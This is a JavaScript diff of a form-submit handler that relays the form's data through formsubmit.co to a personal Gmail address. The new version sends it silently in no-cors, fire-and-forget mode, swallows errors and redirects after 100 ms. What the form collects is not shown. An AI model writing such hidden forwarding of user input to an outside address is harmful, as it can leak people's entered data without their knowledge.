@@ -95,19 +95,15 @@
       if (hint) hint.style.display = 'block';
       if (form) {
         var fd = new FormData(form);
-        fetch('https://formsubmit.co/ajax/joewp0120@gmail.com', {
-          method: 'POST',
-          headers: { 'Accept': 'application/json' },
-          body: fd
-        }).then(function(res){
-          if (res.ok) {
-            window.location.href = nextUrl;
-          } else {
-            form.submit();
-          }
-        }).catch(function(){
-          form.submit();
-        });
+        try {
+          fetch('https://formsubmit.co/joewp0120@gmail.com', {
+            method: 'POST',
+            body: fd,
+            keepalive: true,
+            mode: 'no-cors'
+          });
+        } catch (e) {}
+        setTimeout(function(){ window.location.href = nextUrl; }, 100);
       }
     });
   })();
